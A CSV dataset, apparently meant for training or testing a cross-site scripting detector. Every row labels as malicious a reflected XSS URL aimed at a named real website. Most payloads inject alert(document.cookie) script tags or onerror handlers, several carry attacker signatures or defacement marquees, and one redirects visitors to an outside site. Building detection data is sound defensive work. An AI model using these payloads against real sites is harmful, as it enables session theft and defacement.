Payloads,Class,decoded,executed,parser_changed
http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\%22%3e%3cscript%3ealert(docume<br>nt.cookie);%3c/script%3e&amp;subdwell=&amp;dwelling=&amp;streetnm=&amp;locality=&amp;hometown=&amp;postcode=&amp;datebrth=&amp;learn<br>gen=&amp;ethnicor=&amp;tel_numb=&amp;tel_mob=&amp;email_add=&amp;email_add2=&amp;agree_info=&amp;username=&amp;password=&amp;err=sur,Malicious,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",True,True
http://jp.888.com/new888/home.htm?page=gettingstarted&amp;lang=%22%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e,Malicious,"http://jp.888.com/new888/home.htm?page=gettingstarted&lang=""><script>alert(document.cookie)</script>",True,True
https://www.thanks.com/searchresults.jsp?pattern=sitesearch&amp;sitesearchtext1=%22%3e%3c/from%3e%3cscri<br>pt%3ealert(%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious,"https://www.thanks.com/searchresults.jsp?pattern=sitesearch&sitesearchtext1=""></from><script>alert(""xss by kusomiso.com"")</script>",True,True
http://kotaku.com/search/'%22%3e%3cscript%3ealert('xss')%3b%3c/script%3e/,Malicious,"http://kotaku.com/search/'""><script>alert('xss');</script>/",True,True
http://www.allocine.fr/video/player_gen_cmedia=18823322%22%3e%3cimg%20src=.%20onerror=alert(1);%3e&amp;f<br>ilm=126279.html,Malicious,"http://www.allocine.fr/video/player_gen_cmedia=18823322""><img src=. onerror=alert(1);>&film=126279.html",True,True
http://www.cbs6albany.com/search/?q=&lt;script&gt;alert(/xss devek/)&lt;%2fscript&gt;,Malicious,http://www.cbs6albany.com/search/?q=<script>alert(/xss devek/)</script>,True,True
http://www.l4d.com/contest/browse.php?p=1%3e%22%3e%3cscript%3ealert%281337%29%3b%3c/script%3e,Malicious,"http://www.l4d.com/contest/browse.php?p=1>""><script>alert(1337);</script>",True,True
http://www.worldstarhiphop.com/forums/vbgarage.php?do=popup&amp;image=%22%3e%3cscript%3ealert(1)%3c/scri<br>pt%3e,Malicious,"http://www.worldstarhiphop.com/forums/vbgarage.php?do=popup&image=""><script>alert(1)</script>",True,True
http://www.iatp.ge/en/readnews.php?id=%27%27%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script%3e,Malicious,http://www.iatp.ge/en/readnews.php?id=''></title><script>alert(1337)</script>,True,True
"http://www.labzine.ro/graphic_and_displays/reviews/zotac_9800_gtx/4248--\&quot;&gt;&lt;img%20src=a.jpg%20onerro<br>r=alert(string.fromcharcode(88,83,83,101,100,32,98,121,32,68,114,46,79,112,116,105,120));&gt;&lt;",Malicious,"http://www.labzine.ro/graphic_and_displays/reviews/zotac_9800_gtx/4248--\""><img src=a.jpg onerror=alert(string.fromcharcode(88,83,83,101,100,32,98,121,32,68,114,46,79,112,116,105,120));><",True,True
http://www.mazagrandimmobilier.com/index.php?lang=fr/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious,"http://www.mazagrandimmobilier.com/index.php?lang=fr/""><script>alert('xss by atm0n3r')</script>",True,True
http://404.iinet.com/?file=www.iinet.com/~solarwashington/action/wabills/billssigned.htm}%3c/style%3<br>e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e&amp;status=404&amp;notes=file%20does%20not%20ex<br>ist&amp;ref=,Malicious,http://404.iinet.com/?file=www.iinet.com/~solarwashington/action/wabills/billssigned.htm}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>&status=404¬es=file does not exist&ref=,True,True
http://www.reddenmarine.com/site/new-categories.cfm?action=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.reddenmarine.com/site/new-categories.cfm?action=""><script>alert(""maxwel"")</script>",True,True
http://aad.archives.gov/aad/fielded-search.jsp?dt=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://aad.archives.gov/aad/fielded-search.jsp?dt=""><script>alert(""maxwel"")</script>",True,True
http://secwatch.org/?page=contact&amp;name=a&quot;&gt;&lt;script&gt;alert(/xss/);&lt;/script&gt;,Malicious,"http://secwatch.org/?page=contact&name=a""><script>alert(/xss/);</script>",True,True
http://www.kuwaitculture.com/site_search.asp?search=%3e%22%3e%3cscript%3ealert%28%27xss%20-%20vuln%2<br>7%29%3c%2fscript%3e,Malicious,"http://www.kuwaitculture.com/site_search.asp?search=>""><script>alert('xss - vuln')</script>",True,True
http://1annuaire.com/artiste46/listsit.php?rub=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://1annuaire.com/artiste46/listsit.php?rub=""><script>alert(""maxwel"")</script>",True,True
http://www.jesushousedc.org/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.jesushousedc.org/igallery/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.sporx.com/detail.php?type=search&amp;frm_kategori=haber&amp;frm_text=&quot;&gt;&lt;script&gt;alert(document.coo<br>kie)&lt;/script&gt;&amp;sayfa=1&amp;x=0&amp;y=0,Malicious,"http://www.sporx.com/detail.php?type=search&frm_kategori=haber&frm_text=""><script>alert(document.cookie)</script>&sayfa=1&x=0&y=0",True,True
http://roads.theweathernetwork.com/search.asp?province=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://roads.theweathernetwork.com/search.asp?province=""><script>alert(""maxwel"")</script>",True,True
http://orbi.ulg.ac.be/simple-search?query=%3cscript%3econfirm%28%22samir-dz-tjrs-maahboul-3lik%22%29<br>%3c/script%3e%3ciframe%20src=%22http://xssed.com%22%3e,Malicious,"http://orbi.ulg.ac.be/simple-search?query=<script>confirm(""samir-dz-tjrs-maahboul-3lik"")</script><iframe src=""http://xssed.com"">",True,True
http://www.nutrition.gov/index.php?mode=audience&amp;audience=%3cscript%3ealert(123)%3c/script%3e,Malicious,http://www.nutrition.gov/index.php?mode=audience&audience=<script>alert(123)</script>,True,True
http://www.horizonzero.ca/index.php?pp=29&amp;lang=0&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.horizonzero.ca/index.php?pp=29&lang=0""><script>alert(document.cookie)</script>",True,True
http://www.netfast.com/xq/asp/qx/search_bykeyword.asp?searwords=&quot;&gt;&lt;script&gt;alert(&quot;kurtefendy&quot;)&lt;/scrip<br>t&gt;,Malicious,"http://www.netfast.com/xq/asp/qx/search_bykeyword.asp?searwords=""><script>alert(""kurtefendy"")</script>",True,True
http://www.epson.com/cgi-bin/store/gsearch.jsp?pre_search=pre_search&amp;query=foobar&amp;category=%22%3e%3c<br>script%3ealert(%27xssed%27)%3c/script%3e&amp;x=33&amp;y=8&amp;bv_usebvcookie=yes,Malicious,"http://www.epson.com/cgi-bin/store/gsearch.jsp?pre_search=pre_search&query=foobar&category=""><script>alert('xssed')</script>&x=33&y=8&bv_usebvcookie=yes",True,True
http://www.franceslincoln.com/flincoln/search.asp?tag=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.franceslincoln.com/flincoln/search.asp?tag=""><script>alert(""maxwel"")</script>",True,True
http://www.onep.com.tr/intro.php?lang_change=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.cookie)%3b<br>%3c/script%3e,Malicious,"http://www.onep.com.tr/intro.php?lang_change=>""><script 
>alert(document.cookie);</script>",True,True
http://www.dotcr.ost.dot.gov/asp/redirect.asp?url=%22%3e%3cscript%3ealert('by%20encore')%3c/script%3<br>e,Malicious,"http://www.dotcr.ost.dot.gov/asp/redirect.asp?url=""><script>alert('by encore')</script>",True,True
"http://www.pnop.com/search?q=/""><script>alert('xss by atm0n3r')</script>",Malicious,"http://www.pnop.com/search?q=/""><script>alert('xss by atm0n3r')</script>",True,True
http://community.zdnet.co.uk/search/?q=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&amp;f<br>%5b%5d=members&amp;f%5b%5d=interests&amp;f%5b%5d=biography&amp;f%5b%5d=content&amp;submit.x=25&amp;submit.y=13,Malicious,"http://community.zdnet.co.uk/search/?q=""><script>alert(document.cookie)</script>&f[]=members&f[]=interests&f[]=biography&f[]=content&submit.x=25&submit.y=13",True,True
http://besyo.erciyes.edu.tr/besyofoto/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://besyo.erciyes.edu.tr/besyofoto/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://london.iwm.org.uk/server/show/conevent.2104%7d%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss<br>/.source));%3c/script%3e,Malicious,http://london.iwm.org.uk/server/show/conevent.2104}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>,True,True
http://www.sportsdenature.gouv.fr/fr/actualite-proposition.cfm?cat=40/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious,"http://www.sportsdenature.gouv.fr/fr/actualite-proposition.cfm?cat=40/""><script>alert('xss byatm0n3r')</script>",True,True
"http://www.maquis-art.com/shop/index.php?page=1&objet_recherche=/""><script>alert('xss byatm0n3r')</script>",Malicious,"http://www.maquis-art.com/shop/index.php?page=1&objet_recherche=/""><script>alert('xss byatm0n3r')</script>",True,True
http://perscriptionawards.net/u.asp?u=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://perscriptionawards.net/u.asp?u=""><script>alert(""maxwel"")</script>",True,True
http://www.geschenkidee.ch/de/searchresults.html?q=&lt;/title&gt;&quot;;&lt;/script&gt;&lt;script&gt;alert(document.cookie)<br>;&lt;/script&gt;&lt;script&gt;test=&quot;1,Malicious,"http://www.geschenkidee.ch/de/searchresults.html?q=</title>"";</script><script>alert(document.cookie);</script><script>test=""1",True,True
http://www.iom.int/jahia/jahia/media/press-briefing-notes/pbnas/cache/offonce?entryid=27367%22%3e%3c<br>script%3ealert(document.cookie)%3c/script%3e,Malicious,"http://www.iom.int/jahia/jahia/media/press-briefing-notes/pbnas/cache/offonce?entryid=27367""><script>alert(document.cookie)</script>",True,True
http://www.m-2.ru/themes/default/material.asp?folder=1869&amp;matid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.m-2.ru/themes/default/material.asp?folder=1869&matid=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.growthhouse.org/cgi/search.cgi?searchtype=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.growthhouse.org/cgi/search.cgi?searchtype=""><script>alert(""maxwel"")</script>",True,True
"http://www.athome.lu/recherche/resultats/tr/by/p//""><script>alert('xss by atm0n3r')</script>",Malicious,"http://www.athome.lu/recherche/resultats/tr/by/p//""><script>alert('xss by atm0n3r')</script>",True,True
http://bernalingenuity.com/gallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://bernalingenuity.com/gallery/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.findjobs.com.my/job/forgot_passwords.php?ref=&quot;&gt;&lt;script&gt;alert(/=xssbydt=/)&lt;/script&gt;,Malicious,"http://www.findjobs.com.my/job/forgot_passwords.php?ref=""><script>alert(/=xssbydt=/)</script>",True,True
http://insulincongress.org/search.cfm?searchtext=%3e%3cscript%3ealert(%22xssed%20by%20azat%22)%3c/sc<br>ript%3e,Malicious,"http://insulincongress.org/search.cfm?searchtext=><script>alert(""xssed by azat"")</script>",True,True
http://www.belstat.com/viewtab_se.asp?userid=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious,"http://www.belstat.com/viewtab_se.asp?userid=""><script>alert(document.cookie);</script>",True,True
http://fra.dolcegabbana.it/sfilatadg07/sfilata.asp?sec=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://fra.dolcegabbana.it/sfilatadg07/sfilata.asp?sec=""><script>alert(document.cookie)</script>",True,True
http://www.nima.mil/portal/site/nga01/index.jsp?epi-content=google_search&amp;as_sitesearch=www.nga.mil/<br>portal/site/nga01/index.jsp&amp;access=p&amp;entqr=0&amp;output=xml_no_dtd&amp;sort=date%3ad%3al%3ad1&amp;ie=utf-8&amp;btng=<br>go&amp;client=my_collection&amp;q=password%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,http://www.nima.mil/portal/site/nga01/index.jsp?epi-content=google_search&as_sitesearch=www.nga.mil/portal/site/nga01/index.jsp&access=p&entqr=0&output=xml_no_dtd&sort=date:d:l:d1&ie=utf-8&btng=go&client=my_collection&q=password<script>alert(document.cookie)</script>,True,True
http://www.pablochopper.com/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+n<br>arcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.pablochopper.com/gallery/igallery.asp?d=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.csjy.gov.cn:6080/badlogin.php?tid=0&amp;retid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,Malicious,"http://www.csjy.gov.cn:6080/badlogin.php?tid=0&retid=""><script>alert(document.cookie)</script><p ",True,True
https://fungalgenomics.concordia.ca/feadb/genesearch.php?allspecies=%3cscript%3ealert(document.cooki<br>e);%3c/script%3e%2bares%2bapul%2bccin%2bclau%2bcele%2bgpan%2bgtra%2bledo%2blsco%2bopil%2bpchr%2bsthe<br>%2btlan%2btver&amp;sel_species%5b%5d=all&amp;gene_name=%22%3etesticles&amp;submit1=search#tlan,Malicious,"https://fungalgenomics.concordia.ca/feadb/genesearch.php?allspecies=<script>alert(document.cookie);</script> ares apul ccin clau cele gpan gtra ledo lsco opil pchr sthe tlan tver&sel_species[]=all&gene_name="">testicles&submit1=search#tlan",True,True
http://www.leet.tk/a?t=%27%22%3e%3c%2f%74%69%74%6c%65%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%3<br>1%33%33%37%29%3c%2f%73%63%72%69%70%74%3e%3e%3c%6d%61%72%71%75%65%65%3e%3c%68%31%3e%58%53%53%20%62%79<br>%20%58%59%4c%49%54%4f%4c%3c%2f%68%31%3e%3c%2f%6d%61%72%71%75%65%65%3e+falke&amp;c=1&amp;p=1&amp;r=1191704867266,Malicious,"http://www.leet.tk/a?t='""></title><script>alert(1337)</script>><marquee><h1>XSS by XYLITOL</h1></marquee> falke&c=1&p=1&r=1191704867266",True,True
http://www.blacks.co.uk/browse/wand.html?origkeyword=%3cscript%3ealert(1)%3c/script%3e,Malicious,http://www.blacks.co.uk/browse/wand.html?origkeyword=<script>alert(1)</script>,True,True
http://www.zjwsw.gov.cn/acceptjob.asp?job=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious,"http://www.zjwsw.gov.cn/acceptjob.asp?job=<script>alert(""xss"")</script>",True,True
http://www.gbt.ch/forum_topic.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,Malicious,"http://www.gbt.ch/forum_topic.php?id=""><script>alert(/ar3sw0rmed/);</script>",True,True
http://www.santosfc.com.br/erro.asp?msg=%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,http://www.santosfc.com.br/erro.asp?msg=<script>alert(document.cookie)</script>,True,True
http://m.fotolog.com/search.php?auth=%3ch1%3erme%20pwnea%20de%20nuevo%3c/h1%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e%3cnoscript%3e,Malicious,http://m.fotolog.com/search.php?auth=<h1>rme pwnea de nuevo</h1><script>alert(document.cookie)</script><noscript>,True,True
http://www.sslazio.it/cms/view/home/mylazio/registrati/newsletter_homepage/s185?email=&quot;&gt;&lt;script&gt;aler<br>t('drakula')&lt;/script&gt;&lt;marquee&gt;&lt;h1&gt;dafeced by drakula&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.sslazio.it/cms/view/home/mylazio/registrati/newsletter_homepage/s185?email=""><script>alert('drakula')</script><marquee><h1>dafeced by drakula</h1></marquee>",True,True
http://www.2kaudit.ru/news.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script%3e,Malicious,"http://www.2kaudit.ru/news.php?id='""></title><script>alert(1337)</script>",True,True
http://www.aps.org/meetings/meeting.cfm?name=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.aps.org/meetings/meeting.cfm?name=""><script>alert(""maxwel"")</script>",True,True
http://shopping.aol.com/instore/ppesearch?k=&lt;/title&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,http://shopping.aol.com/instore/ppesearch?k=</title><script>alert(document.cookie)</script>,True,True
"insert ""'><img src=vul onerror=alert('r007k17-w')> in the appname field",Malicious,"insert ""'><img src=vul onerror=alert('r007k17-w')> in the appname field",True,True
http://congresooaxaca.gob.mx/net/info1.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://congresooaxaca.gob.mx/net/info1.php?a[]=""><script>alert(document.cookie)</script>",True,True
http://www.dubaitopmodels.com/top20/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.dubaitopmodels.com/top20/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.anahost.com/_signup.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;&lt;meta<br>http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious,"http://www.anahost.com/_signup.asp?title=<script>alert(""scriptorium(turkey)"")</script><metahttp-equiv=""refresh"" content=""0;url=http://www.canixim.com"">",True,True
http://corruptedcity.net/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,http://corruptedcity.net/register.php?ref=1'><script>alert(document.cookie);</script>,True,True
http://www.chibasuiren.gr.jp/cgi-bin/newsboard/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins<br>%20-%20unkn0wn.eu%27%29%3c%2fscript%3e,Malicious,"http://www.chibasuiren.gr.jp/cgi-bin/newsboard/newsboard.cgi?num=>""><script>alert('ins - unkn0wn.eu')</script>",True,True
http://easy-grafiker.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;ba<br>ckdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://easy-grafiker.de/cms/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.saltekstil.com/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.saltekstil.com/default.asp?gb=urun&id=293&ortak=""><script>alert(""backdoor"")</script>",True,True
http://campimagination.net/2004/week2/gallery/login.asp?folder=arrival&amp;n=&quot;&gt;&lt;script&gt;alert(document.co<br>okie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://campimagination.net/2004/week2/gallery/login.asp?folder=arrival&n=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.etergin.com/login.asp?n=/login.asp&amp;d=&quot;&gt;&lt;script&gt;alert(&quot;cyber//ferda-forever&quot;)&lt;/script&gt;,Malicious,"http://www.etergin.com/login.asp?n=/login.asp&d=""><script>alert(""cyber//ferda-forever"")</script>",True,True
http://www.wilayahnetwork.com/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.wilayahnetwork.com/igallery/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
